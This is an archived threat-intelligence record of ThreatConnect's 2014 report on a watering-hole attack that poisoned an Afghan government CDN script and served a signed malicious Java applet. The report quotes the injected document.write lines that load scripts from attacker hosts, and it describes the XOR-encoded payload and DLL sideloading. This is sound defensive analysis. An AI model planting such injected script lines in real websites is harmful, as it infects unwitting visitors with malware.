{
    "id": "fd8847ca-809f-4bf0-a1ba-7a5fd89fab8e",
    "created_at": "2022-10-25T16:48:16.148703Z",
    "updated_at": "2025-03-27T02:08:24.379064Z",
    "deleted_at": null,
    "sha1_hash": "1a4508469960b248ba713cecf34653c59fd460f1",
    "title": "Operation Poisoned Helmand",
    "authors": "ThreatConnect",
    "file_creation_date": "2014-12-21T22:56:19Z",
    "file_modification_date": "2014-12-21T22:56:19Z",
    "file_size": 439109,
    "plain_text": "In this day and age of interconnected cloud services and distributed content delivery networks (CDNs), it\n\nis important for both CDN service providers and security professionals alike to recognize and understand\n\nthe risks that these systems can introduce within an modern enterprise. For organizations within both\n\npublic and private sectors that leverage CDN platforms to dynamically deliver web content, it is important\n\nthat the content is also routinely monitored. Otherwise, malicious third-party content can be loaded into a\n\ntarget organization’s website without their knowledge, delivering untold risks to unwitting visitors.\n\n## Afghan Government “Watering Hole”\n\n[The ThreatConnect Intelligence Research Team (TCIRT) recently observed a targeted cross-site scripting](http://www.threatconnect.com/why_threat_connect/threatconnect_intelligence_research_team)\n\n(XSS) “drive-by” attack that leveraged a single content delivery network resource to distribute a malicious\n\nJava applet via nearly all of the major official Government of Afghanistan websites. The compromised\n\nCDN resource in question is a JavaScript file hosted at [http:]//cdn.afghanistan[.]af/scripts/gop-script.js\n\nThe domain cdn.afghanistan[.]af is a legitimate CDN site used by the Afghan Ministry of Communications\n\nand IT (MCIT) to host web content that is displayed and used on many official gov.af websites.\n\n\n-----\n\nThe javascript URL ([http:]//cdn.afghanistan[.]af/scripts/gop-script.js) is called from numerous official\n\nAfghan Government websites, including the following:\n\n[http:]//canberra.afghanistan[.]af/en (Afghan Embassy in Canberra, Australia)\n\n[http:]//herat.gov[.]af/fa (Herat Province Regional Government)\n\n[http:]//mfa.gov[.]af/en (Ministry of Foreign Affairs)\n\n[http:]//moci.gov[.]af/en (Ministry of Commerce and Industries)\n\n[http:]//moe.gov[.]af/en (Ministry of Education)\n\n[http:]//mof.gov[.]af/en (Ministry of Finance)\n\n[http:]//moj.gov[.]af/fa (Ministry of Justice)\n\n[http:]//mowa.gov[.]af/fa (Ministry of Women’s Affairs)\n\n[http:]//oaacoms.gov[.]af/fa (Office of Administrative Affairs and Council of Ministers)\n\nIt is likely that this javascript URL itself is normally legitimate, but the attackers obtained access to the file\n\nand prepended the following malicious JavaScript functions to the beginning of the script:\n\n_document.write(\"<script src=http://update.javaplug-in.com/o/j.js><\\/script>\");_\n\n_document.write(\"<script src=http:\\/\\/neoting.com/pay/danal/PhoneBill/07/1.js>_\n\n_<\\/script>\");_\n\nNote that the gov.af websites would not need to be compromised individually for this attack to be\n\ndelivered to visitors of the sites, because it is the backend CDN infrastructure that is serving up the\n\nmalicious script.\n\n\n-----\n\nJudging by the last modified timestamp on the HTTP response of gop-script.js, which is Tue, 16 Dec 2014\n\n08:07:06 GMT, this malicious CDN compromise was very recent in nature. In fact, it occurred on the very\n\n[same day that China’s Prime Minister Li Keqiang would meet with Abdullah Abdullah, the Chief Executive](http://www.china-embassy.org/eng/zgyw/t1220079.htm)\n\nOfficer of Afghanistan in Astana Kazakhstan, they would discuss infrastructure development and bilateral\n\ncooperation issues.\n\nLooking at the EXIF metadata of the image of Keqiang meeting with Abdullah that is hosted on the\n\nChinese embassy website we note a Tue, 16 December 2014 07:43:31 modify time as well as the\n\nwww.news[.]cn watermark in the bottom righthand corner. This indicates that the image of Keqiang and\n\nAbdullah was likely taken and edited sometime prior to 07:43:31. While it is ambiguous as to which\n\ntimezone the edits actually took place in (Kazakhstan or China) we assume the date\n\ntimestamp references GMT because the press release states “In the afternoon of December 15 local time…”\n\nIf we assume the photograph and afternoon meeting took place sometime prior to 13:43 Alma-Ata\n\nstandard time (+0600) this would closely correspond with a 07:43 GMT time stamp. The modification of\n\nthe gop-script.js by the attackers at 08:07:06 GMT likely tracks extremely close to a window of a few hours\n\nin which Keqiang met with Abdullah.\n\n\n-----\n\nIt is worth mentioning that a similar scenario occurred on June 20th when security researcher\n\n[PhysicalDrive0 observed a malicious Java file hosted on the Embassy of Greece in Beijing. At the time, a](https://twitter.com/PhysicalDrive0/status/479921770838102017)\n\n[Chinese delegation led by Keqiang was visiting Greek Prime Minister Antonis Samaras in Athens. Security](https://twitter.com/ThreatConnect/status/480070196011737088)\n\n[researcher R136a1 aka “thegoldenmessenger” released a followup blog with detailed analysis of the Greek](https://twitter.com/TheEnergyStory)\n\nembassy compromise.\n\nWhile these two separate events are not directly related, additional research into the status of ministerial\n\nand official government websites on or around the dates of notable Chinese delegations and or bilateral\n\nmeetings may yield additional patterns of interest.\n\n## Java Malware Overlap\n\nUpon closer inspection of the prepended malicious JavaScript code, one will notice the similarity in the\n\nupdate.javaplug-in[.]com naming convention and URL structure to the C2 domain java-se[.]com found in\n\n[the Palo Alto Networks blog post Attacks on East Asia using Google Code for Command and Control and](http://researchcenter.paloaltonetworks.com/2014/08/attacks-east-asia-using-google-code-command-control/)\n\n[associated with Operation Poisoned Hurricane. However, the malicious document.write driveby URLs](https://www.fireeye.com/blog/threat-research/2014/08/operation-poisoned-hurricane.html)\n\nlisted above both result in 403 Forbidden errors as of December 18, 2014.\n\n\n-----\n\nJava applet submission to VirusTotal that confirms the nature of this malicious activity. This Java applet,\n\n[SHA1: 388E6F41462774268491D1F121F333618C6A2C9A, has no antivirus detections as of December](https://www.virustotal.com/en/file/4cc859f16cfb51f7cf5d4f24f6a371f321722fbd8a0a45c62c0fac5ac89b86bd/analysis/)\n\n21st. The applet contains its malicious class file at the path “jre7u61windows/x86/Update.class”. This\n\nclass file downloads and decodes an XOR 0xC8 encoded Windows PE executable payload from\n\n[http:]//mfa.gov[.]af/content/images/icon35.png, hosted on the official Afghan Ministry of Foreign\n\nAffairs site, which was also affected by the gop-script XSS.\n\nUsing historic context archived within ThreatConnect, the TCIRT concluded that this Java applet is from\n\n[the same source code as the applet SHA1: ADC162DD909283097E72FC50B7AB0E04AB8A2BCC, which](https://www.virustotal.com/en/file/3f88dd9f5a93270d94ff40410b050a8e7061b937d7110f13e2132eee18e75991/analysis/)\n\nwas previously observed by the TCIRT at the Operation Poisoned Hurricane related URL\n\n[http:]//jre7.java-se[.]com/java.jar on August 15, 2014. This applet has the same class path, and\n\ndownloads an XOR 0xFF encoded payload executable from the URL [https:]//amco\ntriton.co[.]jp/js/dl/in.jpg. Additional indicators and context associated with this particular Java driveby\n\nactivity can be found in the ThreatConnect Common Community Incident 20140815A: java-se APT\n\nDriveby (shared October 02, 2014)\n\n## The Windows PE Payload\n\nThe XOR 0xC8 encoded payload downloaded from [http:]//mfa.gov[.]af/content/images/icon35.png\n\ndecodes into the Windows PE executable SHA1: 72D72DC1BBA4C5EBC3D6E02F7B446114A3C58EAB\n\nThis executable is a self-extracting (SFX) Microsoft Cabinet executable that is digitally signed with a valid\n\ncertificate from “OnAndOn Information System Co., Ltd.”, serial number “1F F7 D8 64 18 1C 55 5E 70 CF\n\nDD 3A 59 34 C4 7D”. This same certificate was also used to sign the Java applet that downloaded this\n\nmalware.\n\nThis executable drops the following files:\n\nSHA1: 2068260601D60F07829EE0CEDF5A9C636CDB1765 (dllhost.exe)\n\nLegitimate Microsoft Debugging Tools for Windows Executable, loads dbgeng.dll\n\nSHA1: E2D93ABC4C5EDE41CAF1C0D751A329B884D732A2 (dbgeng.dll)\n\n[Malicious DLL that loads into the above dllhost.exe, using a similar DLL sideloading technique to that](http://www.rsaconference.com/writable/presentations/file_upload/hta-w04a-dll-side-loading-a-thorn-in-the-side-of-the-anti-virus-_av_-industry.pdf)\n\nmost commonly associated with the PlugX backdoor.\n\nSHA1: 5C8683E3523C7FA81A0166D7D127616B06334E8D (Readme.txt)\n\nMalicious encrypted backdoor binary blob loaded by dbgeng dll\n\n\n-----\n\noracle0876634.javaplug-in[.]com. Note that javaplug-in[.]com is the same root domain found in the\n\ncompromised version of [http:]//cdn.afghanistan[.]af/scripts/gop-script.js as [http:]//update.javaplug\nin[.]com/o/j.js, confirming that this Java malware is in fact directly associated with the Afghan MCIT\n\nCDN XSS compromise.\n\nFull indicators of this activity and a YARA rule to detect the malware certificate can be found in the\n\n[ThreatConnect Common Community under Incident 20141217A: Afghan Government Java Driveby and](https://app.threatconnect.com/tc/auth/incident/incident.xhtml?incident=170659)\n\n[signature APT_OnAndOn_cert.yara.](https://app.threatconnect.com/tc/auth/signature/signature.xhtml?signature=170665)\n\n## Conclusion\n\nAs the US and NATO reduce their troop levels in Afghanistan, China is posturing to fill the gap of\n\ninfluence that the west is leaving behind. With plans to facilitate multilateral peace talks with the Taliban\n\nand establish major transportation projects which aim to bolster the Afghan economy, Beijing has been\n\neyeing Afghanistan as part of its broader South Asian strategy.\n\nBy exploiting and co-opting Afghan network infrastructure that is used by multiple ministerial level\n\nwebsites, Chinese intelligence services would be able to widely distribute malicious payloads to a variety of\n\nglobal targets using Afghanistan’s government websites as a topical and trusted distribution platform,\n\nexploiting a single hidden entry point. This being a variant of a typical “watering-hole” attack, the\n\nattackers will most likely infect victims outside the Afghan government who happened to be browsing any\n\none of the CDN client systems, specifically, partner states involved in the planned troop reduction.\n\nIt is important to consider that corporate enterprises are not immune to this tactic, and this is not just a\n\ntechnique that is used by APT threat actors. If an enterprise’s website leverages a CDN to speed up content\n\ndelivery, unintended consequences must be anticipated. Fortunately, modern browsers now implement a\n\nsecurity concept called “Content Security Policy”. As long as the server’s response headers are configured\n\nproperly, third party content may be restricted to originating from a narrow whitelist.\n\nJust as attackers distribute malicious content to users en masse or CDN services distribute web content to\n\nusers, security professionals must be able to quickly distribute actionable Threat Intelligence in formats\n\n[readable by both humans and machines. ThreatConnect is the industry’s first comprehensive](http://www.threatconnect.com/product/why_threat_connect/what_is_threat_intelligence_platform) Threat\n\nIntelligence Platform that enables enterprises to orchestrate the aggregation of Threat Intelligence from\n\nmultiple sources, use integrated analytics and a robust API that gives enterprises the control to action\n\n[their own Threat Intelligence, in the cloud and on premises. Register for a free account now to view the](http://www.threatconnect.com/product/threatconnect_cloud)\n\nCommon Community shares and more.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/emf5ke7j5q12sku7vvvb0c1hbk70fygb",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2014/2014.12.21.Operation_Poisoned_Helmand/operation-poisoned-helmand.pdf"
    ],
    "report_names": [
        "operation-poisoned-helmand"
    ],
    "threat_actors": [
        {
            "id": "722b693d-cfdc-489e-a540-78c7d52ac5a8",
            "created_at": "2022-10-25T16:07:23.713768Z",
            "updated_at": "2025-03-27T02:02:09.940058Z",
            "deleted_at": null,
            "main_name": "Hurricane Panda",
            "aliases": [
                "Operation Poisoned Hurricane"
            ],
            "source_name": "ETDA:Hurricane Panda",
            "tools": [
                "CHINACHOPPER",
                "China Chopper",
                "Mimikatz",
                "SinoChopper"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716496,
    "ts_updated_at": 1743041304,
    "ts_creation_date": 1419202579,
    "ts_modification_date": 1419202579,
    "files": {
        "pdf": "https://archive.orkl.eu/1a4508469960b248ba713cecf34653c59fd460f1.pdf",
        "text": "https://archive.orkl.eu/1a4508469960b248ba713cecf34653c59fd460f1.txt",
        "img": "https://archive.orkl.eu/1a4508469960b248ba713cecf34653c59fd460f1.jpg"
    }
}